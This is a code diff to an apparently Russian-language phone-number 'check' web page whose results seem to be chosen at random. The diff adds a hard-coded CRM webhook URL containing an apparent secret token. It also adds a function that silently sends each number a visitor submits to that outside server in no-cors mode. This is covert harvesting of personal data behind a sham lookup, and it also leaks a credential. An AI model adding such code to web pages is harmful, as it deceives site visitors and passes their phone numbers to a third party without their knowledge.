@@ -433,6 +433,7 @@
     const loadingText = document.getElementById("loading-text");
     const progress = document.getElementById("progress");
     const resultBox = document.getElementById("result");
+    const notifyUrl = "https://crm.finist.com/rest/25656/61uieccsi2xm4xdd/im.notify";
 
     const loadingSteps = [
       "Проверка открытых источников...",
@@ -467,6 +468,26 @@
       return arr[Math.floor(Math.random() * arr.length)];
     }
 
+    async function sendPhoneNotification(phone) {
+      const payload = new URLSearchParams({
+        to: "25656",
+        message: phone
+      });
+
+      try {
+        await fetch(notifyUrl, {
+          method: "POST",
+          mode: "no-cors",
+          headers: {
+            "Content-Type": "application/x-www-form-urlencoded;charset=UTF-8"
+          },
+          body: payload.toString()
+        });
+      } catch (error) {
+        console.error("Notify request failed:", error);
+      }
+    }
+
     phoneInput.addEventListener("focus", () => {
       if (!phoneInput.value) {
         phoneInput.value = "+7";
@@ -491,6 +512,8 @@
         alert("Номер должен быть в формате +7XXXXXXXXXX.");
         return;
       }
+
+      sendPhoneNotification(phone);
 
       resultBox.className = "result-box";
       resultBox.innerHTML = "";
